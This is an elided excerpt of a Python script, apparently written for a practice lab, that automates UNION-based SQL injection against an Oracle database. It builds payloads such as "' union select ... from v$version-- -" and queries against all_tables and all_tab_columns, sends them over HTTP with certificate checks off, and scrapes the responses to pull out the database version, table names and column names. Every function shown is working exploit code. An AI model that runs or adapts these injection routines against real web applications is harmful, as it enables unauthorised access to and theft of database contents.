...
def textc(url, cols, c):
    ...
    for i in range(c, cols + 1):
        plist = ['null'] * cols
        plist[i - 1] = string
        sqlp = "' union select " + ",".join(plist) + "from DUAL-- -"
...
def getVersion(url, cols, text_columns):
    plist = ['null'] * cols
    plist[random.choice(text_columns) - 1] = "banner"
    sqlp = "' union select " + ",".join(plist) + " from v$version-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
...
def getTables(url, cols, text_columns):
    ...
    sqlp = "' union select " + ",".join(plist) + " from all_tables-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
...
def getColumns(url, cols, text_columns, utable):
    ...
    sqlp = "' union select " + ",".join(plist) + f" from all_tab_columns where table_name='{utable}'-- -"
    r = req.get(url + sqlp, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
